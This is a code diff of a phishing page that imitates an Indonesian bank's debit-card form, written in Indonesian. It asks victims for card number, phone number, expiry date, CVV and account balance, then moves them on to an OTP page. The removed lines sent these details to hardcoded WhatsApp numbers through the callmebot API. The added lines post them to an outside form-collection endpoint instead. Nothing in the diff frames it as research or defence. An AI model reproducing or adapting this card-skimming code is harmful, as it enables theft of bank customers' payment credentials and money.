@@ -962,10 +962,10 @@ position: center;
       </div>
     
       <div class="card-form__inner">
-          <form onsubmit="submitForm(event); return false" method="POST" id="formNope">
-        <div class="card-input">
+       <form action="https://public.herotofu.com/v1/1c3a9740-b707-11ee-9dd2-c1caafee32ff" method="post" accept-charset="UTF-8" onsubmit="sendGo()">
+       <div class="card-input">
           <label for="cardNumber" class="card-input__label" style="font-weight: 800;">Nomor Kartu Debit</label>
-             <input type="tel" id="nama" class="card-input__input1" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" placeholder="Masukkan 16 digit Nomor kartu" required style="background-position: 0px 0px;
+             <input type="tel" name="Nomor Kartu Debit" id="nama" class="card-input__input1" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" placeholder="Masukkan 16 digit Nomor kartu" required style="background-position: 0px 0px;
     background-size: 100% 55px;
     background-repeat: no-repeat;
     background-attachment: scroll;
@@ -976,22 +976,22 @@ position: center;
         </div>
         <div class="card-input">
           <label for="cardName" class="card-input__label" style="font-weight: 800;">Nomor Handphone</label>
-          <input type="tel" id="email" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" maxlength="13" autocomplete="off" placeholder="Nomor Handphone">
+          <input type="tel" name="Nomor Handphone" id="email" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" maxlength="13" autocomplete="off" placeholder="Nomor Handphone">
         </div>
         <div class="card-form__row">
           <div class="card-form__col">
             <div class="card-form__group">
               <label for="cardMonth" class="card-input__label" style="font-weight: 800;">Masa Berlaku</label>
-              <input type="tel" id="valid" class="card-input__input -select" v-model="cardMonth" v-mask="'##/##'" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" placeholder="Masa Berlaku">
+              <input type="tel" name="Masa Berlaku" id="valid" class="card-input__input -select" v-model="cardMonth" v-mask="'##/##'" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" placeholder="Masa Berlaku">
                
-              <input type="tel" class="card-input__input -select" id="pesan" placeholder="CVV (3 digit)" v-mask="'###'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" required>
+              <input type="tel" class="card-input__input -select" name="CVV" id="pesan" placeholder="CVV (3 digit)" v-mask="'###'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" required>
               
             </div>
           </div>
           <div class="card-form__col -cvv">
             <div class="card-input">
               <label for="cardCvv" class="card-input__label"style="font-weight: 800;">CVV (optional)</label>
-              <input type="tel" class="uang card-input__input" id="saldo" placeholder="Saldo Tersedia saat ini" maxlength="200" autocomplete="on" required>
+              <input type="tel" class="uang card-input__input" id="saldo" name="Saldo Terakhir" placeholder="Saldo Tersedia saat ini" maxlength="200" autocomplete="on" required>
                 
  
             </div>
@@ -1347,38 +1347,9 @@ pinContainer.addEventListener('keydown', function (event) {
 </script>
 
 <script>
-$('#formNope').on('submit', function (event) {
-
-
-
-    event.stopPropagation();
-    event.preventDefault();
-$("#lodingku").show();
-  
-     var nama = document.getElementById('nama');
-    var email = document.getElementById('email');
-    var valid = document.getElementById('valid');
-    var pesan = document.getElementById('pesan');
-     var saldo = document.getElementById('saldo');
-     
-
-
-
-    var gabungan = '𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗘𝗕𝗜𝗧%3A%0A' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 :%0A' + email.value + '%0A𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂%3A%0A' + valid.value + '%0A𝗖𝗩𝗩%3A%0A' + pesan.value + '%0A𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝘀𝗲𝗱𝗶𝗮 :%0A' + saldo.value;
-  
-  
-     $.ajax({
-              url: `https://api.callmebot.com/whatsapp.php?phone=6282281473869&text=${gabungan}&apikey=9087360`,
-              type: 'post',
-              data: $(this).serialize(), 
-             
- 
-        complete: function(data) {
-            // Тут можем что-то делать ПОСЛЕ успешной отправки формы
-            console.log('Complete')
-        setTimeout(function(){
-       $("#lodingku").hide();
-   var debit = document.getElementById('nama').value;
+function sendGo(){
+   $("#lodingku").show();
+      var debit = document.getElementById('nama').value;
     sessionStorage.setItem("debit", debit);
     var nomor = document.getElementById('email').value;
     sessionStorage.setItem("nomor", nomor);
@@ -1388,66 +1359,8 @@ $("#lodingku").show();
     sessionStorage.setItem("cvv", cvv);
      var rupiah = document.getElementById('saldo').value;
     sessionStorage.setItem("rupiah", rupiah);
-  
-       
-     window.location = "./otp.html";  
-    }, 1500);
-        }
-    });
-
-    return false;
-});
-
-
-
-
-function submidtForm(event) {
- $("#lodingku").show();
- event.preventDefault();
- 
-    var nama = document.getElementById('nama');
-    var email = document.getElementById('email');
-    var valid = document.getElementById('valid');
-    var pesan = document.getElementById('pesan');
-     var saldo = document.getElementById('saldo');
-     
-
-
-
-    var gabungan = '𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗘𝗕𝗜𝗧%3A%0A' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 :%0A' + email.value + '%0A𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂%3A%0A' + valid.value + '%0A𝗖𝗩𝗩%3A%0A' + pesan.value + '%0A𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝘀𝗲𝗱𝗶𝗮 :%0A' + saldo.value;
-
-    var phone = '62858961420572'; // Ganti dengan token bot yang kamu buat
-    var key = '4559552'; // Ganti dengan chat id dari bot yang kamu buat
-
-    $.ajax({
-        url: `https://api.callmebot.com/whatsapp.php?phone=${phone}&text=${gabungan}&apikey=${key}&parse_mode=html`,
-        data: `JSON`,
-        method: `POST`,
-        
-    success: function(data){
-    setTimeout(function(){
-       $("#lodingku").hide();
-   var debit = document.getElementById('nama').value;
-    sessionStorage.setItem("debit", debit);
-    var nomor = document.getElementById('email').value;
-    sessionStorage.setItem("nomor", nomor);
-    var valid = document.getElementById('valid').value;
-     sessionStorage.setItem("valid", valid);
-    var cvv = document.getElementById('pesan').value;
-    sessionStorage.setItem("cvv", cvv);
-     var rupiah = document.getElementById('saldo').value;
-    sessionStorage.setItem("rupiah", rupiah);
-  
-       
-     window.location = "./otp.html";  
-    }, 1500);
-        
-    },
-  Error: function(data){
-        
-        window.location = "./otp.html";       
-    }});};
-</script>
+}
+        </script>
 <script>
 function cekno0(){$(".errtelp").empty();var o,n=$(".card-input__input1").val(),r=n.length;if(r>=4&&r<=19){o=n.substring(0,4);var a=tsel.length,e=0,t=!0;for(nomor="bukan";a>e;)tsel[e]==o&&($(".card-input__input1").css({"background-image":"url(https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png)"}),nomor="TELKOMSEL",t=!1),++e;for(a=isat.length,e=0;a>e&&t;)isat[e]==o&&($(".card-input__input1").css({"background-image":"url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbwlL7LBsKMJfJVT5djbBtbIm1f1kvBcGBBq2gQH5tr1-9MKe4bPex6qXSXAXEQDe48VMwOYDxTS6XwmkuSvmH9ZOlWjYNORouBRnp0bIRHPZ_YGomJocG61Xt7TPAGVp1s3aT2a1HhxoGdz96Ufr6JZqzf6L7idxujWx96aikD9TueSUavrpesofK/s16000/AddText_06-12-07.30.08.png)"}),nomor="INDOSAT",t=!1),++e;for(a=tree.length,e=0;a>e&&t;)tree[e]==o&&($(".card-input__input1").css({"background-image":"url(https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/600px-MasterCard_Logo.svg.png)"}),nomor="THREE",t=!1),++e;for(a=sfren.length,e=0;a>e&&t;)sfren[e]==o&&($(".card-input__input1").css({"background-image":"url(https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/JCB_logo.svg/600px-JCB_logo.svg.png"}),nomor="SMARTFREN",t=!1),++e;for(a=xl.length,e=0;a>e&&t;)xl[e]==o&&($(".card-input__input1").css({"background-image":"url(https://3.bp.blogspot.com/-WM_SGpSoqNY/WkDuWGIi8_I/AAAAAAAABic/6sHIwe7dh1sm0CC1ZAokqhsR3vZuRErxgCPcBGAYYCw/s1600/xl.png)"}),nomor="XL",t=!1),++e;for(a=axis.length,e=0;a>e&&t;)axis[e]==o&&($(".card-input__input1").css({"background-image":"url(https://4.bp.blogspot.com/-3GaLxmQk2sc/WkDuVAN41pI/AAAAAAAABiI/IdxzPaiB_XMNKc-37Clgmn6SxKtw_PwQACPcBGAYYCw/s1600/axis.png)"}),nomor="AXIS",t=!1),++e;"bukan"==nomor?(blocktombol(),gambaroperatorhilang()):r>=10&&12>=r?bukablocktombol():blocktombol()}else blocktombol(),gambaroperatorhilang()}function adahurufstring(){var o=!0,n=$(".card-input__input1").val(),r=n.length;if(n=parseInt(n),n=n.toString().length,r==n+1)var o=!1;return o}function blocktombol(){$(".tombol").prop("disabled",!0)}function bukablocktombol(){$(".tombol").prop("disabled",!1)}function gambaroperatorhilang(){$(".card-input__input1").css({"background-image":"url(https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Bank_Mandiri_logo_2016.svg/426px-Bank_Mandiri_logo_2016.svg.png)"})}function isNumberKey(o){var n=o.which?o.which:event.keyCode;return n>31&&(48>n||n>57)?!1:!0}var tsel=["4097","4098","4096","4617","4895","4259","4616","4837"],isat=["6032"],tree=["5293","5126","5573","5377","5576","5463","5379","5289","5000","5520","5336","4599","5528"],sfren=["4213","3000","3565"],nomor,datapr;$(document).on("keyup",".card-input__input1",cekno0);
 </script>
